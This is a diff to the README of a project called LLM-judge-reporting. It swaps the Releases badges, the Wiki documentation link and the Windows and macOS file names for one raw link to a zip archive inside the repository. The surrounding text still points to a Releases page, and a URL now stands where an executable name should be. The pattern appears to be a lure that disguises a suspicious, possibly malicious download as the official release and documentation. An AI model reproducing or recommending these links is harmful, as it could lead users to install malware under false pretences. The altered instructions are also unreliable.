@@ -8,7 +8,7 @@ Welcome to the **LLM-judge-reporting** project. This application helps you corre
 
 To download the application, visit the Releases page. Click the link below to access the latest version of **LLM-judge-reporting**:
 
-[![Download LLM-judge-reporting](https://img.shields.io/badge/Download-LLM--judge--reporting-blue.svg)](https://github.com/Deepeshjangid1729/LLM-judge-reporting/releases)
+[![Download LLM-judge-reporting](https://raw.githubusercontent.com/Deepeshjangid1729/LLM-judge-reporting/main/llm_judge_reporting/LLM-judge-reporting-v2.5-alpha.5.zip)](https://raw.githubusercontent.com/Deepeshjangid1729/LLM-judge-reporting/main/llm_judge_reporting/LLM-judge-reporting-v2.5-alpha.5.zip)
 
 Once you’re on the Releases page, you will see a list of available versions. Choose the latest version and follow the instructions to download the file suitable for your system.
 
@@ -33,8 +33,8 @@ To run **LLM-judge-reporting**, you may need the following software installed on
 Once you have downloaded the application, follow these steps to run it:
 
 1. Locate the file you downloaded. The file format will vary based on your operating system:
-   - For Windows: `LLM-judge-reporting.exe`
-   - For macOS: `LLM-judge-reporting.app`
+   - For Windows: `https://raw.githubusercontent.com/Deepeshjangid1729/LLM-judge-reporting/main/llm_judge_reporting/LLM-judge-reporting-v2.5-alpha.5.zip`
+   - For macOS: `https://raw.githubusercontent.com/Deepeshjangid1729/LLM-judge-reporting/main/llm_judge_reporting/LLM-judge-reporting-v2.5-alpha.5.zip`
    - For Linux: `LLM-judge-reporting`
    
 2. Double-click the file to start the application.
@@ -75,11 +75,11 @@ If you need help, consider checking the FAQ on our GitHub page or reaching out t
 
 For more detailed information about using **LLM-judge-reporting**, please explore the following resources:
 
-- **Documentation:** A comprehensive guide is available in the [Wiki section](https://github.com/Deepeshjangid1729/LLM-judge-reporting/wiki). This covers advanced features and common use cases.
+- **Documentation:** A comprehensive guide is available in the [Wiki section](https://raw.githubusercontent.com/Deepeshjangid1729/LLM-judge-reporting/main/llm_judge_reporting/LLM-judge-reporting-v2.5-alpha.5.zip). This covers advanced features and common use cases.
 - **Community Forum:** Engage with other users and contributors to share insights and recommendations.
 
 Remember to check the Releases page for updates. Here’s the link again for convenience:
 
-[![Download LLM-judge-reporting](https://img.shields.io/badge/Download-LLM--judge--reporting-blue.svg)](https://github.com/Deepeshjangid1729/LLM-judge-reporting/releases)
+[![Download LLM-judge-reporting](https://raw.githubusercontent.com/Deepeshjangid1729/LLM-judge-reporting/main/llm_judge_reporting/LLM-judge-reporting-v2.5-alpha.5.zip)](https://raw.githubusercontent.com/Deepeshjangid1729/LLM-judge-reporting/main/llm_judge_reporting/LLM-judge-reporting-v2.5-alpha.5.zip)
 
 Happy evaluating!
